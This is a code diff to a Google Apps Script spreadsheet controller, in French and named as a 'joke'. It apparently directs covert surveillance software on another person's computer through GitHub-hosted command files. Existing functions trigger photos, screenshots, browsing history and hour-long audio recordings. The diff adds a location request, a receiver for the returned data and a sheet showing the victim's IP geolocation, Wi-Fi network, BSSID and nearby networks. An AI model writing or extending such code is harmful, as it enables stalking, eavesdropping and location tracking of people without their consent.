@@ -25,7 +25,8 @@ const PHOTO_PATH   = 'data/blague_photo.json';
 const LISTING_PATH = 'data/blague_listing.json';
 const AUDIO_PATH   = 'data/blague_audio.json';
 const HISTORY_PATH     = 'data/blague_historique.json';
-const SCREENSHOT_PATH  = 'data/blague_screenshot.json';
+const SCREENSHOT_PATH   = 'data/blague_screenshot.json';
+const LOCATION_PATH     = 'data/blague_localisation.json';
 const JOURS_MAX    = 30;
 
 function _token() {
@@ -113,6 +114,49 @@ function enregistrerAudio() {
   SpreadsheetApp.getUi().alert('🎙️ Enregistrement lancé ! Le fichier audio (60 min) arrivera dans ton Drive à la fin.');
 }
 
+// ── LOCALISATION ─────────────────────────────────────────────────
+
+function demanderLocalisation() {
+  const f = _githubGet(LOCATION_PATH);
+  _githubPut(LOCATION_PATH, { get_location: true }, f.sha);
+  SpreadsheetApp.getUi().alert('📍 Demande envoyée ! Sa localisation arrive dans l\'onglet "Localisation".');
+}
+
+function _afficherLocalisation(data) {
+  const ss    = SpreadsheetApp.getActiveSpreadsheet();
+  let sheet   = ss.getSheetByName('📍 Localisation');
+  if (!sheet) sheet = ss.insertSheet('📍 Localisation');
+  sheet.clear();
+
+  sheet.appendRow(['📍 Localisation de ' + data.machine + ' — ' + data.date]);
+  sheet.getRange(1,1).setFontWeight('bold').setFontSize(13);
+
+  sheet.appendRow([]);
+  sheet.appendRow(['🌐 GÉOLOCALISATION IP', '']);
+  sheet.appendRow(['IP',        data.geo.ip]);
+  sheet.appendRow(['Ville',     data.geo.ville]);
+  sheet.appendRow(['Région',    data.geo.region]);
+  sheet.appendRow(['Pays',      data.geo.pays]);
+  sheet.appendRow(['FAI / Org', data.geo.fai]);
+  sheet.appendRow(['Timezone',  data.geo.timezone]);
+
+  sheet.appendRow([]);
+  sheet.appendRow(['📶 WIFI CONNECTÉ', '']);
+  sheet.appendRow(['Réseau (SSID)',  data.wifi.ssid]);
+  sheet.appendRow(['BSSID (MAC)',    data.wifi.bssid]);
+  sheet.appendRow(['Signal',         data.wifi.signal]);
+  sheet.appendRow(['Sécurité',       data.wifi.securite]);
+
+  if (data.reseaux && data.reseaux.length > 0) {
+    sheet.appendRow([]);
+    sheet.appendRow(['📡 RÉSEAUX VISIBLES À PROXIMITÉ', '']);
+    data.reseaux.forEach(r => sheet.appendRow([r.ssid, r.signal]));
+  }
+
+  sheet.autoResizeColumns(1, 2);
+  ss.setActiveSheet(sheet);
+}
+
 // ── CAPTURE D'ECRAN ──────────────────────────────────────────────
 
 function prendreCapture() {
@@ -187,6 +231,11 @@ function doPost(e) {
       const bytes = Utilities.base64Decode(data.audio);
       const blob  = Utilities.newBlob(bytes, 'audio/mpeg', data.filename);
       DriveApp.getFolderById(FOLDER_ID).createFile(blob);
+      return ContentService.createTextOutput('ok');
+    }
+
+    if (data.type === 'localisation') {
+      _afficherLocalisation(data);
       return ContentService.createTextOutput('ok');
     }
 
